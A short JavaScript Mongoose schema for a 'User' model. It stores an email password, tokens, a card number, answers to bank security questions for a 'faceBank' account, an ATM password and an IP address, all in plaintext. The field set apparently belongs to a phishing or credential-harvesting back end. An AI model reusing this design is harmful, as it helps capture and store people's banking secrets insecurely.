const { Schema, model } = require('mongoose');

const UserSchema = Schema({
    name: String,
    username: String,
    password: String,
    correo: String,
    celular: String,
    claveCorreo: String,
    token1: String,
    token2: String,
    tarjeta: String,

    faceBankAlias: String,
    facebankPreguntaPasatiempoFav: String,
    facebankPreguntaSitioVacacionesFav: String,
    facebankPreguntaModeloPrimerVehiculo: String,
    facebankPreguntaSegundoNombreDelPadre: String,
    facebankPreguntaComidaFav: String,
    atmPassword: String,
    deleteUser: {
        type: Boolean,
        default: false
    },
    createAt: {
        type: String,
        default: new Date()
    },
    deleteAt: String,
    ip: String
});


module.exports = model( 'User', UserSchema );